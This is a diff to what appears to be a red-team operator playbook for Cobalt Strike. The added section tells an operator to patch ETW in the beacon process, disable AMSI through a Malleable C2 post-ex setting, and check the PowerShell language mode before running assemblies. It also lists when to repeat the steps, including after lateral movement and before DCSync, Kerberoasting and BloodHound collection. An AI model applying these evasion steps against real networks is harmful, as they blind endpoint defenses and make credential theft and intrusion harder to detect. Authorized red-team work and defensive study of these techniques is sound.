@@ -449,14 +449,31 @@ Cannot disable kernel callbacks without kernel code execution. **Find an alterna
 
 ---
 
-## ETW Bypass
+## ETW + AMSI Bypass — Run Together Before Heavy Post-Ex
 
-```
-# Patch EtwEventWrite in ntdll — cuts EDR telemetry
-beacon> inline-execute etw_patch.o    # OPSEC-SAFE (BOF — in beacon thread)
+Patch both before any `execute-assembly`, `powerpick`, or credential access work.
+
+```cs
+// Step 1 — Patch ETW in current beacon process (cuts EDR telemetry feed)
+beacon> inline-execute etw_patch.o          // OPSEC-SAFE — BOF, runs in beacon thread
+
+// Step 2 — AMSI handled automatically by post-ex block in Malleable C2 profile:
+// post-ex { set amsi_disable "true"; }
+// This disables AMSI in every fork & run sacrificial process (execute-assembly, powerpick)
+
+// Step 3 — Confirm before running tools
+beacon> powerpick $ExecutionContext.SessionState.LanguageMode
+// FullLanguage = AMSI not blocking → safe to run assemblies
 ```
 
-Pair ETW patch with AMSI bypass before heavy post-ex work.
+**When to run:**
+```
+After first beacon checks in → before any post-ex tool execution
+After lateral move to new host → repeat ETW patch on new beacon
+Before DCSync, Kerberoast, BloodHound collection
+```
+
+> ETW patch is per-process — does not persist across beacon migrations or new processes.
 
 ---
 
